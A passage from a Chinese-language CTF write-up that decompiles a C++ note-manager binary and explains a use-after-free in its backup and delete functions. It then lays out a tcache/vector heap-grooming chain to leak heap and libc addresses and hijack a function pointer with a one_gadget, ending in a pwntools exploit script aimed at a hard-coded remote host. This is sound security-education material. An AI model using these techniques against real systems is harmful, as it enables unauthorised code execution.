          NoteImpl *v1; // rax
          if ( (unsigned __int8)std::unique_ptr::operator bool(this) != 1 )
            v1 = (NoteImpl *)std::unique_ptr::get((__int64)this + 8);
          else
            v1 = (NoteImpl *)std::unique_ptr::get((__int64)this);
          return NoteImpl::add(v1);
        }
判断`NoteStorageImpl`中的`member_1`是否为空，若不为空，则操作`member_1`，否则操作`member_2`。
                unsigned __int64 __fastcall NoteImpl::add(NoteImpl *this)
        {
          __int64 v1; // rax
          __int64 v2; // rax
          __int64 v3; // rax
          _QWORD *v4; // rax
          __int64 v5; // rax
          char v7; // [rsp+17h] [rbp-9h] BYREF
          unsigned __int64 v8; // [rsp+18h] [rbp-8h]
          v8 = __readfsqword(0x28u);
          v7 = 0;
          if ( *((_BYTE *)this + 8) != 1 )
          {
            v1 = std::operator>(&std::cout, "Do you want to clear it?(y/N)");
            std::ostream::operator>);
            std::operator>>>(&std::cin, &v7);
            if ( v7 == 'y' && *((_BYTE *)this + 8) != 1 )
            {
              v2 = std::operator>(&std::cout, "you can only clear once!!");
              std::ostream::operator>);
              std::vector::clear((_QWORD *)this + 2);
              *((_BYTE *)this + 8) = 1;
            }
          }
          v3 = std::operator>(&std::cout, "content(q to quit):");
          std::ostream::operator>);
          while ( 1 )
          {
            v4 = (_QWORD *)std::operator>>>(&std::cin, &v7);
            if ( !(unsigned __int8)std::ios::operator bool((char *)v4 + *(_QWORD *)(*v4 - 0x18LL)) || v7 == 'q' )
              break;
            if ( (unsigned __int64)std::vector::size((char *)this + 0x10) > 0x1000 )
            {
              v5 = std::operator>(&std::cout, "nonono!");
              std::ostream::operator>);
              exit(0);
            }
            std::vector::push_back((char *)this + 16, &v7);
          }
          return __readfsqword(0x28u) ^ v8;
        }
结构体`NoteImpl`成员`buf_1`都有一次`clear`的机会，除此之外，只能通过`push_back`追加，总长度最多为0x1000。
    * saveHouse： 
                __int64 __fastcall NoteStorageImpl::saveHouse(NoteStorageImpl *this)
        {
          NoteImpl *v1; // rax
          __int64 result; // rax
          NoteImpl *v3; // rax
          __int64 v4; // rax
          if ( (unsigned __int8)std::unique_ptr::operator bool(this) )
          {
            v1 = (NoteImpl *)std::unique_ptr::get((__int64)this);
            result = NoteImpl::save(v1);
          }
          else if ( (unsigned __int8)std::unique_ptr::operator bool((char *)this + 8) )
          {
            v3 = (NoteImpl *)std::unique_ptr::get((__int64)this + 8);
            result = NoteImpl::save(v3);
          }
          else
          {
            v4 = std::operator>(&std::cout, "You have no house to save!!!");
            result = std::ostream::operator>);
          }
          return result;
        }
顺序判断`member_1`和`member_2`是否为空，不为空，则调用：
                __int64 __fastcall NoteImpl::save(NoteImpl *this)
        {
          return std::vector::shrink_to_fit((__int64)this + 16);
        }
对相应`member_1`（或者`member_2`）结构体中的`buf_1`vector进行`shrink_to_fit`操作，即将vector的大小缩小到满足储存需要并且对齐0x10的最小值；从行为上看，是会将原来所占的buffer给先`free`掉，然后根据原vector的size重新再`malloc`空间。
这是很关键的一个函数，由于vector的所占内存空间的增长方式是倍增，所以如果想要获得某个特定大小的vector，就可通过`shrink_to_fit`来实现，此时vector的倍增基数就变成了可控的大小。
    * backup： 
                unsigned __int64 __fastcall NoteStorageImpl::backup(NoteStorageImpl *this)
        {
          __int64 v2; // [rsp+18h] [rbp-18h] BYREF
          char v3[8]; // [rsp+20h] [rbp-10h] BYREF
          unsigned __int64 v4; // [rsp+28h] [rbp-8h]
          v4 = __readfsqword(0x28u);
          if ( (unsigned __int8)std::unique_ptr::operator bool((char *)this + 16) != 1 )
          {
            v2 = std::unique_ptr::get((__int64)this);
            std::make_unique(v3, &v2);
            std::unique_ptr::operator=((char *)this + 16, v3);
            std::unique_ptr::~unique_ptr(v3);
          }
          return __readfsqword(0x28u) ^ v4;
        }
判断`NoteStorageImpl`中的`house->status`是否为0，若为0则将`member_1`赋值给`house->member`。
    * encourage： 
                __int64 __fastcall NoteStorageImpl::encourage(NoteStorageImpl *this)
        {
          NoteDBImpl *v1; // rax
          __int64 result; // rax
          __int64 v3; // rax
          if ( (unsigned __int8)std::unique_ptr::operator bool((char *)this + 16) )// judge if backed up
          {
            v1 = (NoteDBImpl *)std::unique_ptr::get((__int64)this + 16);
            result = NoteDBImpl::getEncourage(v1);
          }
          else
          {
            v3 = std::operator>(&std::cout, "You can not get encourage now!");
            result = std::ostream::operator>);
          }
          return result;
        }
        __int64 __fastcall NoteDBImpl::getEncourage(NoteDBImpl *this)
        {
          __int64 result; // rax
          result = **((unsigned int **)this + 1);
          if ( (_DWORD)result )
            result = (***((__int64 (__fastcall ****)(_QWORD))this + 1))(*((_QWORD *)this + 1));
          return result;
        }
在`house`存在的情况下，且`house->member`以及`house->member->func_get_encourage`不为0，则调用相应的`house->member->func_get_encourage`函数。
    * delHouse： 
                __int64 __fastcall NoteStorageImpl::delHouse(NoteStorageImpl *this)
        {
          NoteDBImpl *v1; // rax
          __int64 result; // rax
          __int64 v3; // rax
          if ( (unsigned __int8)std::unique_ptr::operator bool((char *)this + 16) )// judge if backed up
          {
            v1 = (NoteDBImpl *)std::unique_ptr::get((__int64)this + 16);
            NoteDBImpl::setdel(v1);
            result = std::unique_ptr::reset((__int64)this, 0LL);
          }
          else
          {
            v3 = std::operator>(&std::cout, "You can not delete now!");
            result = std::ostream::operator>);
          }
          return result;
        }
        NoteDBImpl *__fastcall NoteDBImpl::setdel(NoteDBImpl *this)
        {
          NoteDBImpl *result; // rax
          result = this;
          *(_BYTE *)this = 1;
          return result;
        }
        __int64 __fastcall std::unique_ptr::reset(__int64 a1, __int64 a2)
        {
          __int64 v2; // rax
          __int64 result; // rax
          __int64 v4; // rax
          __int64 v5; // [rsp+0h] [rbp-10h] BYREF
          __int64 v6; // [rsp+8h] [rbp-8h]
          v6 = a1;
          v5 = a2;
          v2 = std::__uniq_ptr_impl>::_M_ptr(a1);
          std::swap(v2, &v5);
          result = v5;
          if ( v5 )
          {
            v4 = std::unique_ptr::get_deleter(v6);
            result = std::default_delete::operator()(v4, v5);
          }
          return result;
        }
在`house`存在的情况下，置`house->status`为1，并释放`house->member`内存空间以及置`NoteStorageImpl->member_1`为0。
显然这里`house->member`本身并没有置0，且`delHouse`和`encourage`也没有检查就使用了，显然存在uaf。
    * show： 
                int __fastcall NoteStorageImpl::show(NoteStorageImpl *this)
        {
          NoteDBImpl *v1; // rax
          int result; // eax
          __int64 v3; // rax
          if ( (unsigned __int8)std::unique_ptr::operator bool((char *)this + 16) )
          {
            v1 = (NoteDBImpl *)std::unique_ptr::get((__int64)this + 16);
            result = NoteDBImpl::gift(v1);
          }
          else
          {
            v3 = std::operator>(&std::cout, "NO!");
            result = std::ostream::operator>);
          }
          return result;
        }
        int __fastcall NoteDBImpl::gift(NoteDBImpl *this)
         {
           int result; // eax
           result = *(unsigned __int8 *)this;
           if ( (_BYTE)result )
             result = puts(*((const char **)this + 1));
           return result;
         }
在`backup`并且`delHouse`之后（即`house->status = 1`），调用此函数可以打印出`house->member` 内容。
  2. 根据以上分析，可以发现，当依次调用了`backup`和`delHouse`功能后，虽然`NoteStorageImpl->member_1 = 0`且空间被释放，但是`NoteStorageImpl->house->member`却没有清空；于是只要再把这块空间`malloc`出来，就可以通过`show`把该块chunk中残留的一些指针leak出来，同时如果把该`NoteImpl->func_get_encourage`给劫持成onegadget，再调用就可以getshell了。
  3. 其实题目也有些小提示，比如特意在`NoteImpl`结构体中`offset = 0x1b8`的位置留了一个`malloc`的地址可以用来leak libc，在`offset = 0x1a0`的地方留一个vector结构体可以用来leak heap。
  4. 整个利用思路如下： 
    * 首先依次调用`backup`和`delHouse`，将`member_1`给释放掉；此时tcache中存在一个`size = 0x350`的chunk，接下来利用就是围绕这个chunk。
    * 调用`editHouse`（此时不`clear`），写入0x1a0字节的数据，由于实际是通过不断地`push_back`写入的，所以最终会得到一个`size = 0x290`的chunk。
    * 调用`save`，触发对上述提到的chunk进行`shrink_to_fit`，从而将`0x290`的chunk释放掉，得到一个`size = 0x1b0`的chunk。
    * 继续进行`editHouse`，继续`push_back`写入0x10个字节数据，因为`push_back`的过程中，vector的size会不断增大，从而最终超过该chunk的size，vector就会进行倍增，从而`malloc`出一个`size = 0x350`的chunk，也就是拿到了`NoteStorageImpl->member_1`（或`NoteStorageImpl->house->member`）所在的chunk；这样再通过`show`就能leak出紧跟在后面的heap和malloc的地址。
    * 最后调用`editHouse`，并`clear`掉vector，即后续`push_back`会从chunk头开始，这样就可以覆盖`house->member->func_get_encourage = onegadget`。
    * 调用`encourage`功能，触发onegadget。
  5. exp： 
        #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    import sys, os, re
    context(arch='amd64', os='linux', log_level='debug')
    p = remote('106.14.216.214', 27972)
    p.sendlineafter(">> ", "3")
    p.sendlineafter(">> ", "5")
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Do you want to clear it?(y/N)", "n")
    p.sendlineafter("content(q to quit):", "A" * 0x1A0 + "q")
    p.sendlineafter(">> ", "2")
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Do you want to clear it?(y/N)", "n")
    p.sendlineafter("content(q to quit):", "A" * 8 + "heapaddr" + "q")
    p.sendlineafter(">> ", "6")
    p.recvuntil("heapaddr")
    heap_base = u64(p.recv(6).ljust(8, "\x00")) - 0x121e5
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Do you want to clear it?(y/N)", "n")
    p.sendlineafter("content(q to quit):", "libcaddr" + "q")
    p.sendlineafter(">> ", "6")
    p.recvuntil("libcaddr")
    libc_base = u64(p.recv(6).ljust(8, "\x00")) - libc.sym['malloc']
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Do you want to clear it?(y/N)", "y")
    p.sendlineafter("content(q to quit):", p64(heap_base + 0x11e98) + p64(libc_base + 0x10a41c) + 'q')
    p.sendlineafter(">> ", "4")
    success("libc_base: " + hex(libc_base))